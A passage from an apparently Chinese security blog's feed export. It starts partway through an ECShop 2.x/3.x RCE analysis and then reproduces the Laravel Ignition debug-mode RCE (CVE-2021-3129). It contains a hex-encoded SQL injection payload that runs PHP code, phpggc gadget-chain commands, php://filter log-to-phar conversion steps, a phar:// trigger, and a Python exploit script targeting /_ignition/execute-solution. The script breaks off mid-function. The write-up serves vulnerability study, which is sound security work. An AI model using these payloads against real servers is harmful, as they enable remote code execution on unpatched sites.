<p>&#x80AF;&#x5B9A;&#x9996;&#x5148;&#x5F97; <code>fetch_str</code> &#x5904;&#x7406;&#x622A;&#x65AD;&#x540E;&#x7684; <code>filename</code> &#xFF0C;&#x4E5F;&#x5C31;&#x662F;<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">{$asd<span class="hljs-string">&apos;];phpinfo\t();//}xxx</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x540E;&#x9762;&#x7ECF;&#x8FC7;&#x4E00;&#x987F;&#x64CD;&#x4F5C;&#xFF0C;&#x5404;&#x79CD;&#x66FF;&#x6362;&#x4E4B;&#x540E;&#xFF0C;&#x539F;&#x6765;&#x7684;&#x503C;&#x53D8;&#x6210;&#x4E86; <code>$asd&apos;];phpinfo\t();//</code> </p>
<p>&#x8FDB;&#x5165; <code>select</code> &#x51FD;&#x6570;&#xFF0C;&#x5173;&#x952E;&#x70B9;&#x5982;&#x4E0B;&#x3002;&#x8FD4;&#x56DE;&#x503C;&#x662F;&#x76F4;&#x63A5; php echo &#x51FA;&#x6765;&#x7684;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125124304197.png" alt="image-20201125124304197"></p>
<p>&#x540E;&#x9762;&#x7684;&#x8FC7;&#x7A0B;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x5206;&#x6790;&#x7684;&#x65F6;&#x5019;&#x662F;&#x61F5;&#x903C;&#x7684;&#xFF0C;&#x5176;&#x5B9E;&#x662F;&#x7F3A;&#x4E4F;&#x4E86;&#x5BF9;&#x524D;&#x9762; SQL &#x8BED;&#x53E5;&#x7684;&#x5927;&#x5C40;&#x89C2;&#xFF0C;&#x800C;&#x4E14;&#x6D41;&#x7A0B;&#x5F88;&#x6742;&#xFF0C;&#x5404;&#x79CD; <code>replace</code> &#x7684;&#x66FF;&#x6362;&#x548C;&#x5404;&#x79CD; <code>if</code>&#x3002;</p>
<p>@badcode &#x4ECE;&#x5B8F;&#x89C2;&#x4E0A;&#x603B;&#x7ED3;&#x7684; SQL &#x8BED;&#x53E5;&#x548C;&#x6700;&#x540E; <code>position_style</code> &#x7684;&#x5173;&#x7CFB;&#x5DF2;&#x7ECF;&#x5F88;&#x7B80;&#x6D01;&#x4E86;&#x3002;&#x6211;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x590D;&#x8FF0;</p>
<blockquote>
<p>&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x628A;&#x6784;&#x9020;&#x597D;&#x7684;&#x4EE3;&#x7801;&#x901A;&#x8FC7;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x4F20;&#x7ED9;<code>$position_style</code>&#x3002; &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7528;union select &#x6765;&#x63A7;&#x5236;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6839;&#x636E;&#x4E4B;&#x524D;&#x7684;&#x6D41;&#x7A0B;&#xFF0C;<code>$row[&apos;position_id&apos;]</code>&#x548C;<code>$arr[&apos;id&apos;]</code>&#x8981;&#x76F8;&#x7B49;&#xFF0C;<code>$row[&apos;position_id&apos;]</code>&#x662F;&#x7B2C;&#x4E8C;&#x5217;&#x7684;&#x7ED3;&#x679C;&#xFF0C;<code>$position_style</code>&#x662F;&#x7B2C;&#x4E5D;&#x5217;&#x7684;&#x7ED3;&#x679C;&#x3002;<code>$arr[&apos;id&apos;]</code>&#x4F20;&#x5165;<code>&apos; /*</code>,<code>$arr[&apos;num&apos;]</code>&#x4F20;&#x5165;<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>&#xFF0C;<code>0x27202f2a</code>&#x662F;<code>&apos; /*</code>&#x7684;16&#x8FDB;&#x5236;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>$row[&apos;position_id&apos;]</code>&#x7684;&#x503C;&#xFF0C;<code>0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>&#x662F;&#x4E0A;&#x9762;&#x6784;&#x9020;&#x7684;php&#x4EE3;&#x7801;&#x7684;16&#x8FDB;&#x5236;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>$position_style</code>&#x3002;</p>
</blockquote>
<p><code>get_var</code> &#x4E2D;&#x4F1A;&#x8C03;&#x7528; <code>make_var</code>&#xFF0C;&#x6700;&#x540E;&#x8FD4;&#x56DE;&#x503C;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125125626867.png" alt="image-20201125125626867"></p>
<p>&#x8BBA; <code>$position_style</code> &#x7684;&#x6F14;&#x53D8;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">{$asd<span class="hljs-string">&apos;];phpinfo\t();//}xxx</span></span><br><span class="line"><span class="hljs-string">$res = $static_res[$arr[&apos;</span>id<span class="hljs-string">&apos;]]; -&gt; foreach ($res AS $row) -&gt; $position_style = $row[&apos;</span>position_style<span class="hljs-string">&apos;];</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">str:{$asd&apos;</span>];phpinfo\t();<span class="hljs-comment">//}xxx</span></span><br><span class="line">$position_style = <span class="hljs-string">&apos;str:&apos;</span> . $position_style;</span><br><span class="line"> </span><br><span class="line">$asd<span class="hljs-string">&apos;];phpinfo\t();//}xxx</span></span><br><span class="line"><span class="hljs-string">return preg_replace_callback(&quot;/{([^\}\{\n]*)}/&quot;, function($r) use(&amp;$template){return $template-&gt;select($r[1]);}, $source);</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">asd&apos;</span>];phpinfo\t();<span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-keyword">elseif</span> ($tag{<span class="hljs-number">0</span>} == <span class="hljs-string">&apos;$&apos;</span>){<span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&lt;?php echo &apos;</span> . <span class="hljs-keyword">$this</span>-&gt;get_val(substr($tag, <span class="hljs-number">1</span>)) . <span class="hljs-string">&apos;; ?&gt;&apos;</span>;}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">$this</span>-&gt;_var[<span class="hljs-string">&apos;asd&apos;</span>];phpinfo\t();<span class="hljs-comment">//&apos;]</span></span><br><span class="line"><span class="hljs-keyword">foreach</span> ($t <span class="hljs-keyword">AS</span> $val) { $p.= <span class="hljs-string">&apos;[\&apos;&apos;</span> . $val . <span class="hljs-string">&apos;\&apos;]&apos;</span>; }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E;&#x8F93;&#x51FA; <code>phpinfo()</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125130011473.png" alt="image-20201125130011473"></p>
<h1 id="4-0-SQLi"><a href="#4-0-SQLi" class="headerlink" title="4.0 SQLi"></a>4.0 SQLi</h1><p>&#x6CA1;&#x627E;&#x5230;&#x5B89;&#x88C5;&#x5305;233333&#x2026;&#x5148;&#x5495;&#x5495;&#x5495;&#x4E86;&#xFF5E;&#xFF5E;&#xFF5E;</p>
<p><a href="https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw</a></p>
<p><a href="http://foreversong.cn/archives/1556" target="_blank" rel="noopener">http://foreversong.cn/archives/1556</a></p>
<h1 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;</h1><p><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">https://paper.seebug.org/695/</a></p>
</body></html>]]></content>
      <categories>
        <category>PHP Sec</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>RCE</tag>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel &lt;= v8.4.2 debug mode RCE 漏洞分析</title>
    <url>/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>CVE-2021-3129&#xFF0C;&#x5229;&#x7528;&#x601D;&#x8DEF;&#x975E;&#x5E38;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x503C;&#x5F97;&#x8BB0;&#x5F55;&#x548C;&#x5B66;&#x4E60;</p>
<a id="more"></a>



<h1 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h1><h2 id="&#x62A5;&#x9519;&#x60C5;&#x51B5;"><a href="#&#x62A5;&#x9519;&#x60C5;&#x51B5;" class="headerlink" title="&#x62A5;&#x9519;&#x60C5;&#x51B5;"></a>&#x62A5;&#x9519;&#x60C5;&#x51B5;</h2><p>&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x662F;&#x57FA;&#x4E8E; Ignition &lt;= 2.5.1&#xFF0C;Ignition &#x662F; Laravel 6 &#x7248;&#x672C;&#x4E4B;&#x540E;&#x7684;&#x9ED8;&#x8BA4;&#x9519;&#x8BEF;&#x9875;&#x9762;&#x751F;&#x6210;&#x5668;</p>
<blockquote>
<p>In addition to displaying beautiful stack traces, Ignition comes with <em>solutions</em>, small snippets of code that solve problems that you might encounter while developping your application. For instance, this is what happens if we use an unknown variable in a template:</p>
</blockquote>
<p>&#x6293;&#x5230; Make variable optional &#x7684;&#x5305;</p>
<p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210119170703152.png" alt></p>
<h2 id="&#x6D41;&#x7A0B;&#x5206;&#x6790;"><a href="#&#x6D41;&#x7A0B;&#x5206;&#x6790;" class="headerlink" title="&#x6D41;&#x7A0B;&#x5206;&#x6790;"></a>&#x6D41;&#x7A0B;&#x5206;&#x6790;</h2><p>&#x4E0A;&#x56FE;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8BF7;&#x6C42;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x8DEF;&#x7531;&#x5B9A;&#x4F4D;&#x4E00;&#x4E0B;&#x76F8;&#x5173;&#x4EE3;&#x7801; <code>vendor/facade/ignition/src/IgnitionServiceProvider.php</code></p>
<p><code>\Facade\Ignition\IgnitionServiceProvider::registerHousekeepingRoutes</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">Route::post(<span class="hljs-string">&apos;execute-solution&apos;</span>, ExecuteSolutionController::class)</span><br><span class="line">  -&gt;middleware(IgnitionConfigValueEnabled::class.<span class="hljs-string">&apos;:enableRunnableSolutions&apos;</span>)</span><br><span class="line">  -&gt;name(<span class="hljs-string">&apos;executeSolution&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD9;&#x91CC;&#x4F1A;&#x89E6;&#x53D1; ExecuteSolutionController &#x7684; invoke</p>
<p><code>\Facade\Ignition\Http\Controllers\ExecuteSolutionController</code></p>
<p>&#x4F1A;&#x8C03;&#x7528;&#x83B7;&#x53D6; solution &#x5BF9;&#x8C61;&#x7684; run &#x65B9;&#x6CD5;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span><span class="hljs-params">(</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  ExecuteSolutionRequest $request,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  SolutionProviderRepository $solutionProviderRepository</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">)</span> </span>{</span><br><span class="line">  $solution = $request-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">  $solution-&gt;run($request-&gt;get(<span class="hljs-string">&apos;parameters&apos;</span>, []));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> response(<span class="hljs-string">&apos;&apos;</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x540E;&#x7EED;&#x8FD8;&#x6709;&#x66F4;&#x6DF1;&#x7684;&#x8C03;&#x7528;&#x6808;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x5C55;&#x5F00;&#x5206;&#x6790;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">ExecuteSolutionController-&gt;__invoke()</span><br><span class="line">-&gt;ExecuteSolutionRequest-&gt;getRunnableSolution()-&gt;getSolution()</span><br><span class="line">-&gt;MakeViewVariableOptionalSolution-&gt;run()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E;&#x6F0F;&#x6D1E;&#x7684;&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>file_get_contents</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span><span class="hljs-params">(array $parameters = [])</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        $output = <span class="hljs-keyword">$this</span>-&gt;makeOptional($parameters);</span><br><span class="line">        <span class="hljs-keyword">if</span> ($output !== <span class="hljs-keyword">false</span>) {</span><br><span class="line">            file_put_contents($parameters[<span class="hljs-string">&apos;viewFile&apos;</span>], $output);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeOptional</span><span class="hljs-params">(array $parameters = [])</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        $originalContents = file_get_contents($parameters[<span class="hljs-string">&apos;viewFile&apos;</span>]);</span><br><span class="line">        $newContents = str_replace(<span class="hljs-string">&apos;$&apos;</span>.$parameters[<span class="hljs-string">&apos;variableName&apos;</span>], <span class="hljs-string">&apos;$&apos;</span>.$parameters[<span class="hljs-string">&apos;variableName&apos;</span>].<span class="hljs-string">&quot; ?? &apos;&apos;&quot;</span>, $originalContents);</span><br><span class="line"></span><br><span class="line">        $originalTokens = token_get_all(Blade::compileString($originalContents));</span><br><span class="line">        $newTokens = token_get_all(Blade::compileString($newContents));</span><br><span class="line"></span><br><span class="line">        $expectedTokens = <span class="hljs-keyword">$this</span>-&gt;generateExpectedTokens($originalTokens, $parameters[<span class="hljs-string">&apos;variableName&apos;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> ($expectedTokens !== $newTokens) {</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> $newContents;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<blockquote>
<p>The only input variable left is <code>viewFile</code>. If we make abstraction of <code>variableName</code> and all of its uses, we end up with the following code snippet:</p>
</blockquote>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$contents = file_get_contents($parameters[<span class="hljs-string">&apos;viewFile&apos;</span>]);</span><br><span class="line">file_put_contents($parameters[<span class="hljs-string">&apos;viewFile&apos;</span>], $contents);</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h1><p>&#x76EE;&#x524D;&#x770B;&#x5230;&#x5927;&#x6982;&#x4E24;&#x4E2A;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7684;&#x65B9;&#x5F0F;</p>
<ul>
<li>Phar &#x53CD;&#x5E8F;&#x5217;&#x5316;</li>
<li>Talking to PHP-FPM using FTP</li>
</ul>
<h2 id="Phar-&#x53CD;&#x5E8F;&#x5217;&#x5316;"><a href="#Phar-&#x53CD;&#x5E8F;&#x5217;&#x5316;" class="headerlink" title="Phar &#x53CD;&#x5E8F;&#x5217;&#x5316;"></a>Phar &#x53CD;&#x5E8F;&#x5217;&#x5316;</h2><p>&#x4E24;&#x79CD;&#x601D;&#x8DEF;&#xFF1A;</p>
<ol>
<li>phar &#x6587;&#x4EF6;&#x76F4;&#x63A5;&#x89E6;&#x53D1;&#xFF08;&#x9700;&#x8981;&#x4E0A;&#x4F20;&#x70B9;&#xFF09;</li>
<li>log&#x6587;&#x4EF6;&#x8F6C;&#x6362;&#x4E3A; phar &#x6587;&#x4EF6;&#xFF08;&#x4E0D;&#x9700;&#x8981;&#x4E0A;&#x4F20;&#x70B9;&#xFF09;</li>
</ol>
<p>&#x4E24;&#x79CD;&#x601D;&#x8DEF;&#x90FD;&#x662F;&#x6253;&#x7684; laravel &#x7684;&#x4F9D;&#x8D56;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x94FE;</p>
<h3 id="&#x76F4;&#x63A5;&#x89E6;&#x53D1;"><a href="#&#x76F4;&#x63A5;&#x89E6;&#x53D1;" class="headerlink" title="&#x76F4;&#x63A5;&#x89E6;&#x53D1;"></a>&#x76F4;&#x63A5;&#x89E6;&#x53D1;</h3><p>&#x5982;&#x679C;&#x80FD;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A; phar&#x6587;&#x4EF6;&#x7684;&#x8BDD;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x89E6;&#x53D1;</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">./phpggc monolog/rce1 system whoami --phar phar -o ./monolog1.gif</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210122231342884.png" alt="image-20210122231342884"></p>
<h3 id="&#x8F6C;&#x6362;&#x89E6;&#x53D1;"><a href="#&#x8F6C;&#x6362;&#x89E6;&#x53D1;" class="headerlink" title="&#x8F6C;&#x6362;&#x89E6;&#x53D1;"></a>&#x8F6C;&#x6362;&#x89E6;&#x53D1;</h3><blockquote>
<p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5305;&#x542B;&#x6BCF;&#x4E2A;PHP&#x9519;&#x8BEF;&#x548C;&#x5806;&#x6808;&#x8DDF;&#x8E2A;&#x7684;Laravel&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x5728;&#x4E2D;<code>storage/log/laravel.log</code></p>
</blockquote>
<p>&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7684;&#x6838;&#x5FC3;&#x601D;&#x8DEF;&#x662F;&#x5C06; log &#x6587;&#x4EF6;&#x8F6C;&#x6362;&#x6210; phar &#x6587;&#x4EF6;&#xFF0C;&#x4ECE;&#x800C;&#x89E6;&#x53D1; phar &#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<h4 id="&#x6E05;&#x7A7A;-log-&#x6587;&#x4EF6;"><a href="#&#x6E05;&#x7A7A;-log-&#x6587;&#x4EF6;" class="headerlink" title="&#x6E05;&#x7A7A; log &#x6587;&#x4EF6;"></a>&#x6E05;&#x7A7A; log &#x6587;&#x4EF6;</h4><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6838;&#x5FC3;&#x601D;&#x8DEF;&#x662F;&#xFF1A;<code>php://filter</code>&#x4E2D;&#x7684;<code>convert.base64-decode</code>&#x8FC7;&#x6EE4;&#x5668;&#x7684;&#x7279;&#x6027;&#x4E3A;&#x8F6C;&#x6362;base64&#x65F6;&#x4F1A;&#x5C06;&#x4E0D;&#x662F;base64&#x7684;&#x5B57;&#x7B26;&#x6E05;&#x7A7A;</p>
<p>PS&#xFF1A; &#x9700;&#x8981;&#x8FDE;&#x7EED;&#x7684;&#x4E24;&#x6B21;&#x8FD4;&#x56DE;&#x4E3A; 200 &#x7684; status &#x624D;&#x80FD;&#x5B8C;&#x5168;&#x6E05;&#x7A7A; log</p>
<h4 id="&#x7ED9;log&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x524D;&#x7F00;"><a href="#&#x7ED9;log&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x524D;&#x7F00;" class="headerlink" title="&#x7ED9;log&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x524D;&#x7F00;"></a>&#x7ED9;log&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x524D;&#x7F00;</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">viewFile: AA</span><br></pre></td></tr></tbody></table></figure><p></p>
<h4 id="&#x5199;&#x5165;-phar-&#x6570;&#x636E;&#x8FDB;-log-&#x6587;&#x4EF6;"><a href="#&#x5199;&#x5165;-phar-&#x6570;&#x636E;&#x8FDB;-log-&#x6587;&#x4EF6;" class="headerlink" title="&#x5199;&#x5165; phar &#x6570;&#x636E;&#x8FDB; log &#x6587;&#x4EF6;"></a>&#x5199;&#x5165; phar &#x6570;&#x636E;&#x8FDB; log &#x6587;&#x4EF6;</h4><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">php -d<span class="hljs-string">&apos;phar.readonly=0&apos;</span> ./phpggc monolog/rce1 system whoami --phar phar -o php://output | base64 -w0</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x518D;&#x7528; python &#x8FDB;&#x884C;&#x8F6C;&#x6362;</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line">s = [PAYLOAD]</span><br><span class="line"><span class="hljs-string">&apos;&apos;</span>.join([<span class="hljs-string">&quot;=&quot;</span> + hex(ord(i))[<span class="hljs-number">2</span>:] + <span class="hljs-string">&quot;=00&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]).upper()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5C06;&#x7F16;&#x7801;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x76F4;&#x63A5;&#x5199;&#x8FDB;&#x6587;&#x4EF6;</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">viewFile: [PAYLOAD]</span><br></pre></td></tr></tbody></table></figure><p></p>
<h4 id="&#x89E6;&#x53D1;-Phar-&#x53CD;&#x5E8F;&#x5217;&#x5316;"><a href="#&#x89E6;&#x53D1;-Phar-&#x53CD;&#x5E8F;&#x5217;&#x5316;" class="headerlink" title="&#x89E6;&#x53D1; Phar &#x53CD;&#x5E8F;&#x5217;&#x5316;"></a>&#x89E6;&#x53D1; Phar &#x53CD;&#x5E8F;&#x5217;&#x5316;</h4><p>&#x5148;&#x5C06;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x89E3;&#x7801;&#x6210;&#x53EA;&#x6709; Phar &#x7684;&#x6587;&#x4EF6;</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E;&#x7528;&#x4F2A;&#x534F;&#x8BAE;&#x89E6;&#x53D1; Phar &#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">viewFile: phar:///Applications/MAMP/htdocs/laravel/storage/logs/laravel.log/test.txt</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="&#x5927;&#x5751;"><a href="#&#x5927;&#x5751;" class="headerlink" title="&#x5927;&#x5751;"></a>&#x5927;&#x5751;</h3><p>MAMP &#x795E;&#x4ED9;&#x73AF;&#x5883;&#xFF0C;&#x6700;&#x540E;&#x5C06;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x89E3;&#x7801;&#x7684;&#x65F6;&#x5019;&#x65E0;&#x6CD5;&#x89E3;&#x538B;&#x6210; phar &#x683C;&#x5F0F;&#x5185;&#x5BB9;</p>
<p>&#x6700;&#x540E;&#x4E00;&#x6B65;&#x8FC7;&#x6EE4;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x65F6;&#x5019;&#x5728;&#x73AF;&#x5883;&#x4E0A;&#x6253;&#x8FC7;&#x53BB;&#x4E00;&#x76F4; 500</p>
<p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210123163337310.png" alt="image-20210123163337310"></p>
<p>&#x91CD;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x4EE3;&#x7801;&#x590D;&#x73B0;&#x7684;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$contents = file_get_contents(<span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log&quot;</span>);</span><br><span class="line">file_put_contents(<span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log&quot;</span>, $contents);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210123164709947.png" alt="image-20210123164709947"></p>
<p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210123164631757.png" alt></p>
<p>final POC</p>
<p><a href="https://github.com/P2hm1n/vulnExploit/blob/main/laravel_debugmode_rce.py" target="_blank" rel="noopener">https://github.com/P2hm1n/vulnExploit/blob/main/laravel_debugmode_rce.py</a></p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">&quot;http://laravel:80/index.php/_ignition/execute-solution&quot;</span></span><br><span class="line">headers = {</span><br><span class="line">    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>}</span><br><span class="line">vul_json = {</span><br><span class="line">    <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;parameters&quot;</span>: {</span><br><span class="line">        <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="line">        <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span></span><br><span class="line">        }}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clearLog</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> url, headers, vul_json</span><br><span class="line">    vul_json[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = <span class="hljs-string">&quot;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">        res1 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> res1 <span class="hljs-keyword">and</span> res1.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">            res2 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> res2 <span class="hljs-keyword">and</span> res2.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">                print(<span class="hljs-string">&quot;clear&quot;</span>)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span 